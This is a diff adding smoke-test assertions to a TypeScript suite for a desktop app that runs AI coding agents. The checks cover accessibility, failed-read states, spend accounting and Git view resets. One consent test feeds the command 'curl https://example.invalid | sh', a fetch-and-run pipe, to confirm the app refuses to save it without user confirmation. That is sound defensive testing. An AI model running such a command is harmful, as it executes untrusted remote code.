@@ -24,6 +24,7 @@ import * as schedule from './schedule';
 import * as demo from './demo';
 import * as migrate from './migrate';
 import * as attention from './attention';
+import * as backup from './backup';
 import * as hooks from './hooks';
 import * as observed from './observed';
 import * as otel from './otel';
@@ -732,6 +733,26 @@ export async function runPhaseSmoke2(check: Check, say: Say): Promise<void> {
     && !/onClick=\{onCancel\}/.test(batchesViewSrc),
     'Cancel means cancel: both back buttons and a successful submit drop the remembered draft, so the next New run opens blank rather than on an abandoned or already-submitted one');
 
+  // A <tr> takes no focus, and neither of these rows held a child that did, so
+  // run detail, results, the refusal lane and the evals tab were all reachable
+  // by pointer only. The row click stays for pointers; the identifying cell
+  // becomes the button.
+  check(batchesViewSrc.includes('onClick={(e) => { e.stopPropagation(); onOpen(r.id); }}>{r.name}</button>')
+    && batchesViewSrc.includes('onClick={(e) => { e.stopPropagation(); setOpen(r); }}>{r.custom_id}</button>'),
+    'both of Batches’ clickable tables put a real button on their identifying cell, so a run and a result row can each be opened from the keyboard without the row losing its pointer click',
+    `run name button ${batchesViewSrc.includes('}}>{r.name}</button>')} · custom_id button ${batchesViewSrc.includes('}}>{r.custom_id}</button>')}`);
+  // Three reads on the Evals tab answered a rejection with an empty array, which
+  // turns "Wanigan could not read this" into "there is none of this" — and the
+  // card that says "Only one run exists" is drawn off exactly that array.
+  check(!/catch \{ setPairs\(\[\]\); \}/.test(batchesViewSrc)
+    && !/catch \{ setGolden\(\[\]\); \}/.test(batchesViewSrc)
+    && !/batch\.runs\(\)\.then\(\(r\) => setRuns\(r as Run\[\]\)\)\.catch\(\(\) => \{\}\)/.test(batchesViewSrc)
+    && batchesViewSrc.includes('const [runs, setRuns] = useState<Run[] | null>(null);')
+    && !batchesViewSrc.includes('const t = setInterval(load, 8000);')
+    && batchesViewSrc.includes('const t = setInterval(() => { if (!document.hidden) void load(); }, 8000);'),
+    'no read behind the Evals tab answers a failure with an empty array, and neither eight-second poll spends on a window nobody is looking at — “Only one run exists” is now a count of runs that came back rather than the initial value of a state the read never reached',
+    'four negations and two positives');
+
   const goldenPinRun = await batch.createAndSubmitRun(baseCfg({
     name: 'smoke golden source',
     source: { kind: 'jsonl', text: Array.from({ length: 4 }, (_, i) => `{"text":"gold ${i}"}`).join('\n') },
@@ -745,6 +766,33 @@ export async function runPhaseSmoke2(check: Check, say: Say): Promise<void> {
   check(goldenReplay.requests === pinnedSet.rows,
     'a run built from the golden set carries exactly the pinned row count',
     `${goldenReplay.requests} vs ${pinnedSet.rows}`);
+
+  /* ── P6 · the run list is a list, not a copy of every dataset ──────── */
+  // listRuns() answered SELECT r.*, so the operator's entire pasted CSV crossed
+  // the IPC boundary every eight seconds for a table that draws a name, a
+  // model, four counts and a cost. Measured against a copy of this schema, one
+  // run holding a 20,000-line CSV was 118KB on its own row.
+  const p6Marker = 'CONFIG-MARKER-9f31';
+  const p6Run = await batch.createAndSubmitRun(baseCfg({
+    name: 'smoke config privacy',
+    source: { kind: 'jsonl', text: `{"text":"${p6Marker}"}` },
+  }));
+  const p6Listed = batch.listRuns() as Record<string, unknown>[];
+  const p6Schema = (db().prepare('PRAGMA table_info(runs)').all() as { name: string }[]).map((c) => c.name);
+  const p6Missing = p6Schema.filter((c) => c !== 'config_json' && !(c in (p6Listed[0] ?? {})));
+  check(p6Listed.length > 0 && p6Missing.length === 0 && !('config_json' in p6Listed[0]),
+    'the run list carries every runs column except config_json, so narrowing the read dropped the dataset and nothing else — a hand-typed column list is the version of this that silently loses a value instead',
+    `${p6Listed.length} rows · ${Object.keys(p6Listed[0] ?? {}).length} keys per row · ${p6Schema.length} columns in runs · missing ${p6Missing.join(',') || 'none'}`);
+  check(!JSON.stringify(p6Listed).includes(p6Marker),
+    'and the whole serialised list contains no trace of the row pasted into that run — this is the assertion that fails the moment SELECT r.* comes back',
+    `${JSON.stringify(p6Listed).length} bytes for the entire list`);
+  check(JSON.stringify(batch.runDetail(p6Run.runId).config).includes(p6Marker),
+    'while the run’s own detail page still reads its config back in full, which is where the builder, the retry path and the evals tab get it from — this was a scoping change, not a deletion',
+    batch.runDetail(p6Run.runId).run.id);
+  const p6Row = p6Listed[0];
+  check('kind' in p6Row && 'project_id' in p6Row && 'expires_at' in p6Row && 'project_name' in p6Row,
+    'and the columns its consumers filter on all survived: Schedules’ re-run picker reads kind, the MCP run listing scopes on project_id, and the list’s own expiry and project-name subqueries are still computed',
+    Object.keys(p6Row).join(','));
 
   /* ── which CLI a provider actually runs ────────────────────────────── */
   // Everything a session gets — hooks, MCP servers, --session-id, an archived
@@ -3557,6 +3605,16 @@ export async function runPhaseSmoke2(check: Check, say: Say): Promise<void> {
     control.completeNode(implementNode.id, { detail: 'Implementation evidence recorded.' });
     const verifyNode = control.docket(docket.id).nodes.find((node) => node.kind === 'verify')!;
     review.saveRecipe(controlProject.id, ['true']);
+    let consentRefusal = '';
+    try { await review.saveRecipeWithConsent(null, controlProject.id, ['true', 'curl https://example.invalid | sh']); }
+    catch (e) { consentRefusal = e instanceof Error ? e.message : String(e); }
+    check(consentRefusal.includes('needs the Wanigan window open')
+      && review.recipe(controlProject.id).commands.join('\n') === 'true',
+      'a review command the stored recipe does not already hold cannot be saved with no window to confirm it, and the refusal leaves the previously consented recipe exactly as it was rather than half-writing the new one',
+      review.recipe(controlProject.id).commands);
+    check((await review.saveRecipeWithConsent(null, controlProject.id, ['true'])).commands.join('\n') === 'true',
+      're-saving the exact set already stored asks nothing and needs no window, because dropping or reordering commands grants a gate nothing it could not already run and a prompt there would train people to click through the one that matters',
+      review.recipe(controlProject.id).commands);
     const proof = await control.runProof(verifyNode.id);
     check(proof.status === 'passed', 'the review gate becomes a durable passed proof rather than terminal text');
     control.completeNode(verifyNode.id, { detail: 'Gate passed.' });
@@ -4253,6 +4311,76 @@ export async function runPhaseSmoke2(check: Check, say: Say): Promise<void> {
     check(armed.autopilot.enabled && armed.autopilot.providerId === 'claude' && armed.autopilot.model === 'smoke-model'
       && armed.autopilot.budgetUsd === 5 && armed.autopilot.spendStatus === 'none',
       'arming autopilot freezes the provider, model and cap it will dispatch against');
+
+    // ── P8 · a reopened task keeps its spend inside the goal ──────────────
+    // work_nodes.session_id is a live pointer and retryNode is the one
+    // statement in main that nulls it. Before work_node_sessions, the money a
+    // failed task had already spent left the cap the moment somebody reopened
+    // it — the sweep would then dispatch the goal again on the strength of
+    // cost it had already incurred, and the card kept saying every session had
+    // reported while the figure beside it was short by exactly that task.
+    // Seeded through the database rather than by launching an agent: a real
+    // dispatch here would start a paid session mid-suite.
+    const spent = control.createDocket({ projectId: controlProject.id, title: 'Reopen keeps the spend',
+      objective: 'A task that spent money is reopened.', acceptance: ['The cap still knows.'],
+      budgetUsd: 5, plan: autoPlan });
+    const spentNode = spent.nodes.find((node) => node.title === 'Auto A')!;
+    db().prepare("UPDATE work_nodes SET status='failed',session_id='sess_p8_spent' WHERE id=?").run(spentNode.id);
+    db().prepare(`INSERT OR REPLACE INTO session_metrics (session_id,metric,attrs,value,last_at)
+      VALUES ('sess_p8_spent','claude_code.cost.usage','',4.2,?)`).run(Date.now());
+    const spendBeforeReopen = control.docket(spent.id).autopilot;
+    control.retryNode(spentNode.id);
+    const spendAfterReopen = control.docket(spent.id).autopilot;
+    check(Math.abs(spendBeforeReopen.spendUsd - 4.2) < 1e-6
+      && Math.abs(spendAfterReopen.spendUsd - 4.2) < 1e-6
+      && spendAfterReopen.spendStatus === 'reported',
+      'reopening a failed task leaves every dollar it already spent inside its goal, because retryNode records the session in work_node_sessions before it drops the pointer on the task row',
+      { before: spendBeforeReopen, after: spendAfterReopen });
+
+    // The negative. A goal that has launched a session may never report that
+    // it has launched none, however many of its tasks were reopened — that is
+    // the sentence the Control card and the phone both render from this field.
+    db().prepare("UPDATE work_nodes SET session_id=NULL WHERE docket_id=?").run(spent.id);
+    const spendWithNoPointers = control.docket(spent.id).autopilot;
+    check(spendWithNoPointers.spendStatus !== 'none'
+      && Math.abs(spendWithNoPointers.spendUsd - 4.2) < 1e-6,
+      'a goal whose tasks no longer point at any session still reports the spend of the sessions it launched, and never falls back to the "no session has been launched" reading it would have to have read a row to earn',
+      spendWithNoPointers);
+
+    // The recorded set is append-only and idempotent, which is what lets both
+    // dispatch and retryNode write the same pair without either checking first.
+    // Reopening the same task under the same session is the cheapest way to
+    // make both writers land on one pair; retryNode refuses a task that is not
+    // failed or canceled, so the status goes back with the pointer.
+    db().prepare("UPDATE work_nodes SET status='failed',session_id='sess_p8_spent' WHERE id=?").run(spentNode.id);
+    control.retryNode(spentNode.id);
+    const spentRows = db().prepare(
+      "SELECT COUNT(*) n FROM work_node_sessions WHERE node_id=? AND session_id='sess_p8_spent'"
+    ).get(spentNode.id) as { n: number };
+    check(spentRows.n === 1,
+      'recording the same task and session twice leaves one row, so a re-dispatch onto a session a task already ran under cannot double-count that session against the cap',
+      spentRows.n);
+
+    // Status and dollars must come from one set. If they ever drift apart the
+    // card asserts "every session reported" over a set that lost a member,
+    // which is the shape of the bug this phase exists to close.
+    db().prepare("UPDATE work_nodes SET status='failed',session_id='sess_p8_quiet' WHERE id=?").run(spentNode.id);
+    control.retryNode(spentNode.id);
+    const spendMixed = control.docket(spent.id).autopilot;
+    check(spendMixed.spendStatus === 'reported' && Math.abs(spendMixed.spendUsd - 4.2) < 1e-6,
+      'a second recorded session that named no cost is still counted as a member of the set the status is decided over, so spendUsd and spendStatus can never be computed from different populations',
+      spendMixed);
+
+    // Source contract, because the query is the fix. A future edit that reads
+    // work_nodes.session_id alone reintroduces the whole defect silently: the
+    // numbers stay plausible and only shrink when somebody presses Reopen.
+    const controlSrcP8 = sourceOf('src/main/control.ts');
+    check(controlSrcP8.includes('UNION SELECT session_id FROM work_node_sessions WHERE docket_id=?')
+      && controlSrcP8.includes('recordNodeSession(nodeId, node.docket_id, node.session_id);')
+      && controlSrcP8.includes('recordNodeSession(nodeId, parent.id, session.id);')
+      && !/const sessions = \(db\(\)\.prepare\("SELECT session_id FROM work_nodes WHERE docket_id=\? AND session_id IS NOT NULL"\)/.test(controlSrcP8),
+      'a goal’s spend is read from the union of its live session pointers and the sessions work_node_sessions has recorded for its tasks, both dispatch and reopen write that record, and the single-table read that let a reopened task refund its own spend is gone',
+      controlSrcP8.slice(controlSrcP8.indexOf('function autopilotSpend'), controlSrcP8.indexOf('function autopilotSpend') + 300));
 
     const swept = control.sweepAutopilot();
     const queuedLabels = queue.listQueue(200).filter((item) => item.kind === 'node').map((item) => item.label);
@@ -5214,6 +5342,72 @@ export async function runPhaseSmoke2(check: Check, say: Say): Promise<void> {
     && runsViewSrc.includes('cue={loadFailed}')
     && /Try again<\/button>/.test(runsViewSrc),
   'Runs holds its run count, "Nothing has run yet" and "No run selected" behind a loaded flag set only by a read that returned, and a failed first read shows that error with a retry rather than a confident zero');
+
+  /* ── P7 · a run's rows, stats and merge belong to that run ──────────
+   * `headless:rows` rejecting for the newly selected run used to leave the
+   * previous run's repositories, Changed and Cost under the new run's name,
+   * with a Squash merge button that acted on the previous run's worktree and
+   * wrote the new run's name into the squash commit. The negatives are the
+   * three lines that did it. */
+  check(runsViewSrc.includes('type RowsState = { runId: string; rows: HeadlessRowSummary[] | null; error: string | null };')
+    && runsViewSrc.includes('const rowsFor = rowsState && rowsState.runId === selected ? rowsState : null;')
+    && runsViewSrc.includes('if (!selected) { setRowsState(null); return; }')
+    && runsViewSrc.includes('if (!prior || prior.runId !== runId) return { runId, rows: null, error: null };')
+    && runsViewSrc.includes('const runName = runs.find((r) => r.id === row.runId)?.name ?? row.runId;')
+    && !runsViewSrc.includes('setRows(')
+    && !/current\?\.name/.test(runsViewSrc),
+  'the Runs inspector keys its repository rows to the run they were read for, drops the previous run rows at the top of the effect rather than when the next read returns, and builds the squash commit message from the row own runId — so a rejected headless:rows can no longer leave one run repositories under another run name, and a Squash merge can no longer stamp the selected run name onto the previous run worktree, permanently, in git history');
+
+  // The rows region answers for its own read now, so the page-level error Note
+  // is left to start, cancel and merge. `rows(selected)` is the negative: the
+  // old call read whatever was selected when the promise was built rather than
+  // the run id the response is then stored against.
+  check(runsViewSrc.includes(`<Reading what="this run's repositories" />`)
+    && runsViewSrc.includes(`posture="could-not-read" title="Could not read this run's repositories"`)
+    && runsViewSrc.includes('onClick={() => setRowsNonce((n) => n + 1)}>Try again</button>')
+    && /\}, \[selected, signature, rowsNonce\]\);/.test(runsViewSrc)
+    && !/rows\(selected\)/.test(runsViewSrc),
+  'a failed read of one run repositories is reported in the rows region itself, with the error and its own retry, instead of an error banner over the previous run table');
+
+  // Both figures are sums over rows, so both wait for the rows. Before this an
+  // unread run printed "0" files and "$0.00 · CLI-reported; never estimated",
+  // which is the confident version of a read that had not happened.
+  check(runsViewSrc.includes(`const rowsUnread = rowsFor?.error`)
+    && runsViewSrc.includes(`? "this run's repositories could not be read"`)
+    && runsViewSrc.includes(`value={totals ? num(totals.changed) : '—'}`)
+    && runsViewSrc.includes(`value={!totals || !costStatus ? '—'`)
+    && runsViewSrc.includes('const totals = useMemo(() => (readRows === null ? null : readRows.reduce((a, r) => ({')
+    && runsViewSrc.includes('if (readRows === null) return null;'),
+  'Changed and Cost print an em dash and say which read they are waiting on until this run rows are in hand, so neither reports a zero it never read');
+
+  // headless:runs is seven correlated subqueries per run over headless_rows,
+  // whose only index is its (run_id, project_id) primary key, and it ran every
+  // three seconds behind a hidden window.
+  check(runsViewSrc.includes('const t = setInterval(() => { if (document.hidden) return; reload(); }, 3000);')
+    && runsViewSrc.includes('const onVisible = () => { if (!document.hidden) reload(); };')
+    && runsViewSrc.includes(`document.addEventListener('visibilitychange', onVisible);`)
+    && runsViewSrc.includes(`document.removeEventListener('visibilitychange', onVisible);`)
+    && !/setInterval\(reload, 3000\)/.test(runsViewSrc),
+  'the Runs history poll stops while the window is hidden and re-reads at once when it comes back, rather than billing seven subqueries per run every three seconds to a screen nobody is looking at');
+
+  // The array identity is the render trigger, and headless:runs hands back
+  // fresh objects every call. ago(createdAt) is inside the fingerprint on
+  // purpose: without it a quiet beat would freeze the relative timestamp.
+  check(/const runsFingerprint = \(list: HeadlessRun\[\]\): string => list/.test(runsViewSrc)
+    && runsViewSrc.includes('|${ago(r.createdAt)}`)')
+    && runsViewSrc.includes('if (look !== painted.current) { painted.current = look; setRuns(next); }')
+    && runsViewSrc.split('setRuns(next)').length === 2,
+  'a poll that would paint the same run list keeps the array it already has, and the relative timestamp is part of what "the same list" means, so nothing on the history freezes to buy that',
+  `setRuns(next) call sites: ${runsViewSrc.split('setRuns(next)').length - 1}`);
+
+  // Measured before the fix: arm the confirmation on run A's row for a
+  // repository, click run B, and B's row for that same repository comes back
+  // already expanded with its Squash merge button armed. confirmMerge is held
+  // by project id, and two runs over one repository share it.
+  check(runsViewSrc.includes('useEffect(() => { setConfirmMerge(null); }, [selected]);')
+    && runsViewSrc.indexOf('useEffect(() => { setConfirmMerge(null); }, [selected]);')
+       > runsViewSrc.indexOf('const [confirmMerge, setConfirmMerge] = useState<string | null>(null);'),
+  'an armed squash-merge confirmation is dropped when the operator selects a different run, so the second deliberate press this destructive action depends on is asked again per run rather than inherited by whichever run is opened next');
   const scoutCssSrc = sourceOf('src/renderer/src/styles/improvement-scout.css');
   const sessionManagerSrc = sourceOf('src/main/sessions.ts');
   check(mainSrc.length > 1000 && preloadSrc.length > 500 && schedulesSrc.length > 500
@@ -5641,6 +5835,53 @@ export async function runPhaseSmoke2(check: Check, say: Say): Promise<void> {
     && !sessionsSrc.includes('import TerminalPane, { feed,'),
   'terminal output is pumped for the window’s lifetime rather than the Sessions view’s, so bytes printed while you are on another tab still land');
 
+  // A pane primes from main's ring buffer on mount, and main appends every
+  // chunk to that buffer before it broadcasts the chunk. So anything printed
+  // during the mount round trip used to arrive twice — once through the live
+  // pump, once inside the primed buffer — and because TUI output carries
+  // cursor addressing, the second copy repaints against a screen that no
+  // longer matches it.
+  check(terminalPaneSrc.includes('if (!entry || entry.priming) return;')
+    && terminalPaneSrc.includes('entry.priming = true;')
+    && terminalPaneSrc.includes('if (pool.get(sessionId) !== pane) return;')
+    && terminalPaneSrc.includes('if (buf) pane.term.write(buf);'),
+  'a terminal drops broadcast chunks only while its one scrollback prime is in flight, so bytes that land during the mount round trip are written once — by the buffer that already carries them — instead of twice',
+  `entry.priming mentions: ${terminalPaneSrc.split('entry.priming').length - 1}`);
+
+  // The gate's own failure mode is worse than the bug it closes: a pane left
+  // priming forever writes nothing again for the life of the session, and a
+  // scrollback that rejects is exactly when that would happen.
+  check(terminalPaneSrc.includes('if (pool.get(sessionId) === pane) finishPrime(pane);')
+    && terminalPaneSrc.split('finishPrime(pane)').length - 1 === 2
+    && terminalPaneSrc.includes('pane.priming = false;'),
+  'a refused scrollback opens the gate it shut, so a pane whose history could not be read still shows everything the agent prints after that',
+  `finishPrime call sites: ${terminalPaneSrc.split('finishPrime(pane)').length - 1}`);
+
+  // Negative, and the one that catches a revert: both one-liners this replaced
+  // are short enough to come back as a "tidy-up" without anyone noticing.
+  check(!terminalPaneSrc.includes('pool.get(sessionId)?.term.write(data)')
+    && !terminalPaneSrc.includes('.then((buf) => { if (buf) entry!.term.write(buf); })')
+    && !terminalPaneSrc.includes('.catch(() => {});'),
+  'neither the ungated one-line feed nor the one-line prime that swallowed its own failure is still in the file, so reverting the duplicate-write fix cannot pass as a reformat',
+  `ungated feed present: ${terminalPaneSrc.includes('pool.get(sessionId)?.term.write(data)')}`);
+
+  // The exited line is composed by this window, not broadcast by main, so no
+  // ring buffer would replay it if the prime gate simply dropped it — and
+  // writing it immediately put it above the history instead of after it.
+  check(terminalPaneSrc.includes('function feedLocal(sessionId: string, text: string)')
+    && terminalPaneSrc.includes('if (entry.priming) entry.pendingLocal.push(text);')
+    && terminalPaneSrc.includes('for (const text of pane.pendingLocal.splice(0)) pane.term.write(text);')
+    && terminalPaneSrc.includes('feedLocal(sessionId, `\\r\\n\\x1b[38;5;244m── session exited'),
+  'the "session exited" line this window composes waits for a prime instead of being dropped by it, and lands after the restored history rather than above it',
+  `pendingLocal mentions: ${terminalPaneSrc.split('pendingLocal').length - 1}`);
+
+  // Negative: the gate is only worth having if broadcast bytes cannot walk
+  // around it through the queue that exists for this window's own text.
+  check(terminalPaneSrc.includes('window.wanigan.on.data(({ sessionId, data }) => feed(sessionId, data))')
+    && !terminalPaneSrc.includes('feedLocal(sessionId, data)'),
+  'broadcast PTY bytes still go through the gated feed() rather than the local queue, so the pump cannot reintroduce the double write by routing around the gate',
+  `feedLocal mentions: ${terminalPaneSrc.split('feedLocal').length - 1}`);
+
   // bumpUnread sat in main from the initial commit with no caller, and
   // sessions:markRead zeroed a field nothing had ever raised, because the count
   // was really being kept in the Sessions view — the one place that cannot see
@@ -5812,6 +6053,67 @@ export async function runPhaseSmoke2(check: Check, say: Say): Promise<void> {
     && gitCssSrc.includes('.pane.gt-view > .pane-head:first-child { padding: var(--s-3); }'),
   'every Git state opens with the shared page head, and its workbench runs to the window edge rather than stopping at the prose measure');
 
+  // `st` is not a cache of the last repository Wanigan managed to read — it is the root every button
+  // on this page hands to main. Nothing used to clear it, so a project whose status read threw left
+  // the previous repository's status, and its root, standing under the new one's name.
+  check(gitViewSrc.includes('const requestEpoch = useRef(0);')
+    && /useEffect\(\(\) => \{\n\s*requestEpoch\.current \+= 1;\n\s*setSt\(null\); setCommits\(\[\]\); setBrs\(\[\]\); setStash\(\[\]\);/.test(gitViewSrc)
+    && gitViewSrc.includes('setDetail(null); setErr(null); setOk(null); setConfirm(null);')
+    && gitViewSrc.includes('setPr(null); setCreating(false);')
+    && gitViewSrc.includes('if (epoch !== requestEpoch.current) return null;'),
+  'the Git view clears the previous repository — status, log, branches, stashes, the open diff, the pending confirmation and the PR chip — synchronously in the same commit that changes the selected root, and stamps every read with an epoch so a late answer for the previous repository cannot land under the new one’s name',
+  JSON.stringify({ epochGuards: (gitViewSrc.match(/epoch [!=]== requestEpoch\.current/g) ?? []).length }));
+
+  // The pending confirmation is the sharpest case and it did not need a failed read at all: its `run`
+  // closure captures the root that was on screen when it was raised, so between two perfectly readable
+  // repositories one press of “Discard changes” acted on the one you had just navigated away from.
+  check(gitViewSrc.includes('setDetail(null); setErr(null); setOk(null); setConfirm(null);')
+    && !/\} catch \(e\) \{ setErr\(e instanceof Error \? e\.message : String\(e\)\); return null; \}/.test(gitViewSrc)
+    && /setSt\(null\); setCommits\(\[\]\); setBrs\(\[\]\); setStash\(\[\]\);\n\s*setErr\(e instanceof Error/.test(gitViewSrc),
+  'a confirmation raised for one repository is dismissed when the selected project changes rather than left on screen one press from acting on the tree you navigated away from, and a status read that throws drops the status it could not confirm instead of leaving it under the twenty-one call sites that pass st.root to the main process',
+  JSON.stringify({ stRootCallSites: (gitViewSrc.match(/st\.root/g) ?? []).length }));
+
+  // Four git reads a beat — status, log, branches, stashes — behind a window nobody is looking at,
+  // while both of the shell's own polls already guarded and said why.
+  check(gitViewSrc.includes('const t = window.setInterval(() => { if (document.hidden) return; void load(); }, 8000);')
+    && gitViewSrc.includes('const onVisible = () => { if (document.hidden) return; void load(); };')
+    && gitViewSrc.includes("document.addEventListener('visibilitychange', onVisible);")
+    && gitViewSrc.includes("document.removeEventListener('visibilitychange', onVisible);")
+    && !gitViewSrc.includes('setInterval(load, 8000)'),
+  'Git’s eight-second repository poll stops while the window is hidden and catches up the moment it comes back, the way both of the shell’s own polls already do, rather than spawning four git reads a beat behind a window nobody is looking at',
+  JSON.stringify({ unguardedIntervalGone: !gitViewSrc.includes('setInterval(load, 8000)') }));
+
+  // The shell seeds its project list empty and surfaces a failed read as a banner, so `length === 0`
+  // was two different facts and this pane printed only one of them.
+  check(appSrc.includes('const [projectsRead, setProjectsRead] = useState(false);')
+    && appSrc.includes('setProviders(pv); setProjects(pj); setHasKey(ks.present); setProjectsRead(true);')
+    && appSrc.includes('<Git projects={projects} projectsRead={projectsRead} />')
+    && gitViewSrc.includes('projectsRead: boolean;')
+    && gitViewSrc.includes('title="Your project list has not been read yet"')
+    && gitViewSrc.includes('title="No project to read git from"'),
+  'Git can tell an unread project list from an empty one and says which it is, so an operator with a dozen repositories is no longer told they have none and offered “Add your first project” before the shell’s first read has returned',
+  JSON.stringify({ wiredInApp: appSrc.includes('projectsRead={projectsRead}') }));
+
+  // A count is a read. Before one returned this printed 0 and “No commits yet.”, and left that
+  // sentence up beside the error Note when the read failed.
+  check(!gitViewSrc.includes('<span className="c">{commits.length}</span>')
+    && !gitViewSrc.includes('{!commits.length && <p className="faint" style={{ padding: 14 }}>No commits yet.</p>}')
+    && gitViewSrc.includes("{st ? commits.length : '—'}")
+    && gitViewSrc.includes('<Reading what="this repository" />')
+    && gitViewSrc.includes('<Reading what="the working tree, branches and stashes" />')
+    && gitViewSrc.includes("{p === 'stash' && st ? ` ${stash.length}` : ''}"),
+  'the Git view prints no count and no “No commits yet.” until a status read has actually returned: before one does it says it is reading, and after one fails it says the read failed rather than leaving a zero and an empty-history sentence standing beside the error',
+  JSON.stringify({ unguardedCommitCountGone: !gitViewSrc.includes('<span className="c">{commits.length}</span>') }));
+
+  // The reading and could-not-read states belong to the workbench. A fourth top-level pane root would
+  // make this a fourth screen and break the head/pane-root contract two checks below.
+  check((gitViewSrc.match(/className="pane gt-view"/g) ?? []).length === 3
+    && (gitViewSrc.match(/\{head\}/g) ?? []).length === 3
+    && gitViewSrc.includes('title="The last read of this repository failed"')
+    && gitViewSrc.includes('<Reading what="the working tree, branches and stashes" />'),
+  'the reading and could-not-read states Git gained are rendered inside its workbench rather than as a fourth top-level pane root, so the view still has exactly three states behind one shared page head',
+  JSON.stringify({ paneRoots: (gitViewSrc.match(/className="pane gt-view"/g) ?? []).length }));
+
   // ── what is left, for every agent ───────────────────────────────────
   // The Usage screen said "read live from each account" and read only the
   // Claude ones. AccountLimits already carried a harness field and
@@ -5898,6 +6200,7 @@ export async function runPhaseSmoke2(check: Check, say: Say): Promise<void> {
   const menuCode = menuSrc.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');
   const bindingsSrc = sourceOf('src/renderer/src/bindings.ts');
   const shellCssSrc = sourceOf('src/renderer/src/styles/shell.css');
+  const useDialogSrc = sourceOf('src/renderer/src/components/useDialog.ts');
   const ungrouped = TABS.map((item) => item.id)
     .filter((id) => !SIDEBAR_GROUPS.some((section) => (section.tabs as readonly string[]).includes(id)));
   check(ungrouped.length === 0,
@@ -5941,12 +6244,49 @@ export async function runPhaseSmoke2(check: Check, say: Say): Promise<void> {
     && appSrc.includes("aria-orientation=\"vertical\"")
     && appSrc.includes("if (event.key === 'ArrowDown')")
     && !appSrc.includes('nav-titlebar') && !appSrc.includes('className="nav-tabs"')
+    && useDialogSrc.includes(`: document.querySelector<HTMLElement>('[data-nav-tab][tabindex="0"]')`)
+    && useDialogSrc.includes(`?? document.querySelector<HTMLElement>('.hdr-toggle')`)
+    && !useDialogSrc.includes('nav-tabs')
     && !cssSrc.includes('.nav-titlebar') && !cssSrc.includes('--rail-h')
     && cssSrc.includes('--sidebar-w')
     && bindingsSrc.includes("id: 'sidebar'") && appSrc.includes("bindingMatches(e, 'sidebar')")
     && appSrc.includes("window.wanigan.prefs.set('nav_sidebar'")
     && settingsSrc.length > 0,
-  'the two-row header became one row plus a hideable vertical list: all fifteen routes, arrow keys on the axis they are drawn on, and a durable open/closed preference');
+  'the two-row header became one row plus a hideable vertical list: all fifteen routes, arrow keys on the axis they are drawn on, a durable open/closed preference, and no .nav-tabs left for a closing dialog to hand focus to');
+
+  // A dialog that closes must put focus somewhere real. The selector this used
+  // to name (`.nav-tabs …`) went away with the horizontal rail, so it matched
+  // nothing and every keyboard user landed on document.body.
+  check(useDialogSrc.includes(`: document.querySelector<HTMLElement>('[data-nav-tab][tabindex="0"]')`)
+    && useDialogSrc.includes(`?? document.querySelector<HTMLElement>('.hdr-toggle')`)
+    && !useDialogSrc.includes('nav-tabs'),
+  'a closing dialog whose opener unmounted hands focus to the sidebar roving tab stop and falls back to the header toggle, and names no .nav-tabs ancestor — the class App stopped rendering, whose selector matched nothing in either sidebar state',
+  useDialogSrc.includes('nav-tabs') ? 'useDialog.ts still names nav-tabs' : `no nav-tabs selector in ${useDialogSrc.length} bytes of useDialog.ts`);
+
+  // Negative, and only said about a file that was actually read: MISSING_SOURCE
+  // is a non-empty sentinel, so the length guard is what makes the absence mean
+  // "read it, it is not there" rather than "could not read it".
+  check(useDialogSrc.length > 1000 && useDialogSrc !== MISSING_SOURCE
+    && !useDialogSrc.includes('.nav-tabs') && !appSrc.includes('nav-tabs'),
+  'neither App.tsx nor useDialog.ts names nav-tabs any more, and that absence is reported from a read that returned a whole file rather than the missing-source sentinel',
+  `useDialog.ts ${useDialogSrc.length} bytes, App.tsx ${appSrc.length} bytes`);
+
+  // The fallback's premise, in the file that has to keep it true. If the toggle
+  // ever moves inside {sidebarOpen && (…)}, the collapsed case has no target and
+  // the hook is silently back to dropping focus on the body.
+  check(appSrc.indexOf('className="hdr-toggle"') < appSrc.indexOf('{sidebarOpen && (')
+    && (appSrc.match(/className="hdr-toggle"/g) ?? []).length === 1
+    && appSrc.includes('<button className="hdr-toggle" type="button" onClick={toggleSidebar}'),
+  'the header toggle useDialog falls back to is rendered once, above the {sidebarOpen && …} guard, so it is still in the document on the frame where the destination list is not',
+  `hdr-toggle at ${appSrc.indexOf('className="hdr-toggle"')}, sidebar guard at ${appSrc.indexOf('{sidebarOpen && (')}`);
+
+  // Catches the whole phase being reverted or dropped: the hook can keep its
+  // docstring and lose its caller, and nothing else in the suite would notice.
+  check(useDialogSrc.includes('function restoreFocus(opener: HTMLElement | null): void {')
+    && useDialogSrc.includes('restoreFocus(opener);')
+    && !useDialogSrc.includes("the rail's single roving tab stop"),
+  'the focus hand-back is still called from the dialog stack teardown, and its comment no longer describes a horizontal rail this app has not rendered since the sidebar landed',
+  useDialogSrc.includes('restoreFocus(opener);') ? 'called on unmount' : 'restoreFocus is defined but never called');
   check(shellCssSrc.includes('.nav-tab-wrap { display: block; }')
     && cssSrc.includes('.nav-progress {')
     && !cssSrc.includes('position: absolute; left: 11px; right: 11px; bottom: 5px;'),
@@ -6272,6 +6612,20 @@ export async function runPhaseSmoke2(check: Check, say: Say): Promise<void> {
     'the optional macOS scheduler is a windowless app daemon, not a timer that dies with the window');
   check(/handle\(\s*'review:run'/.test(mainSrc) && /review_runs/.test(reviewSrc),
     'review gates keep command evidence in a durable record, not only in a terminal scrollback');
+  const browseSrc = sourceOf('src/main/browse.ts');
+  const attachmentsSrc = sourceOf('src/main/attachments.ts');
+  check(/rememberPicked\(res\.filePaths\)/.test(browseSrc)
+    && /rememberPicked\(\[res\.filePaths\[0\]\]\)/.test(browseSrc)
+    && (browseSrc.match(/rememberPicked\(/g) ?? []).length === 3
+    && attachmentsSrc.includes('if (!isPickedPath(abs)) {'),
+    'the record attach:add checks is written only by the two calls that put a native dialog in front of a person, never by browse.browse(), whose unconfined readdir would hand back exactly what the check refuses',
+    (browseSrc.match(/rememberPicked\(/g) ?? []).length);
+  check(/review\.saveRecipeWithConsent\(win, projectId, commands\)/.test(mainSrc)
+    && !/review\.saveRecipe\(projectId, commands\)/.test(mainSrc)
+    && reviewSrc.indexOf('dialog.showMessageBox') > 0
+    && reviewSrc.indexOf('dialog.showMessageBox') < reviewSrc.indexOf('export async function runAt'),
+    'saving a review recipe asks the person and running one does not, because the stored text is written once and run many times from both review:run and a goal’s verify task, so the consent sits where the capability is made rather than on each use of it',
+    /review\.saveRecipeWithConsent\(win, projectId, commands\)/.test(mainSrc));
   check(/handle\(\s*'control:create'/.test(mainSrc) && /control:\s*\{/.test(preloadSrc)
